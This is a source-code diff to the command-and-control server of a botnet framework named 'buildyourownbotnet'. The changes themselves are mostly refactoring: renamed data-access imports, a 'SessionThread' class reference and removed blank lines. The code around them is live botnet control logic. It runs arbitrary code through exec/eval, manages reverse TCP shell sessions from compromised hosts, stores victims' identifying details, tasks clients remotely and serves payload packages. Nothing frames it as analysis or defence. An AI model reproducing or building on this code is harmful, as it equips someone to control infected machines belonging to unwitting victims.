@@ -29,8 +29,8 @@ if sys.version_info[0] > 2:
     sys.path.append('modules')
 
 from buildyourownbotnet import db
-from buildyourownbotnet.core import dao, security, util
-from buildyourownbotnet.models import Session, Task
+from buildyourownbotnet.core import security, util
+from buildyourownbotnet.core.dao import session_dao
 
 # packages
 try:
@@ -195,7 +195,6 @@ class C2(threading.Thread):
         else:
             return "File '{}' not found".format(str(path))
 
-
     def py_exec(self, code):
         """
         Execute code directly in the context of the currently running process
@@ -214,7 +213,6 @@ class C2(threading.Thread):
             exec(code)
         except Exception as e:
             print(e)
-
 
     def py_eval(self, code):
         """
@@ -235,7 +233,6 @@ class C2(threading.Thread):
         except Exception as e:
             print(e)
 
-
     def quit(self):
         """
         Quit server and optionally keep clients alive
@@ -248,7 +245,7 @@ class C2(threading.Thread):
         # put sessions in passive mode
         for owner, sessions in self.sessions.items():
             for session_id, session in sessions.items():
-                if isinstance(session, Session):
+                if isinstance(session, SessionThread):
                     try:
                         session.send_task({"task": "passive"})
                     except: pass
@@ -269,7 +266,6 @@ class C2(threading.Thread):
         util.display('Exiting...')
         sys.exit(0)
 
-
     @util.threaded
     def serve_until_stopped(self):
         while True:
@@ -281,7 +277,7 @@ class C2(threading.Thread):
             if session.info != None:
 
                 # database stores identifying information about session
-                session_dict = dao.handle_session(session.info)
+                session_dict = session_dao.handle_session(session.info)
                 session.id = session_dict['id']
 
                 # display session information in terminal
@@ -306,7 +302,6 @@ class C2(threading.Thread):
             if abort:
                 break
 
-
     @util.threaded
     def serve_resources(self):
         """
@@ -318,7 +313,6 @@ class C2(threading.Thread):
             time.sleep(3)
             globals()['package_handler'].terminate()
             globals()['package_handler'] = subprocess.Popen('{} -m {} {}'.format(sys.executable, http_serv_mod, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
-
 
     def run(self):
         """
@@ -387,7 +381,6 @@ class SessionThread(threading.Thread):
             util.log("Error creating session: {}".format(str(e)))
             self.info = None
 
-
     def kill(self):
         """
         Kill the reverse TCP shell session
@@ -406,7 +399,7 @@ class SessionThread(threading.Thread):
             session = owner_sessions[session_uid]
 
             # set session status as offline in database
-            dao.update_session_status(session_uid, 0)
+            session_dao.update_session_status(session_uid, 0)
 
             # send kill command to client and shutdown the connection
             try:
@@ -439,7 +432,6 @@ class SessionThread(threading.Thread):
                 info[key] = base64.b64decode(val[6:]).decode('ascii')
         return info
 
-
     def send_task(self, task):
         """
         Send task results to the server
@@ -464,7 +456,6 @@ class SessionThread(threading.Thread):
         msg  = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
         return True
-
 
     def recv_task(self):
         """
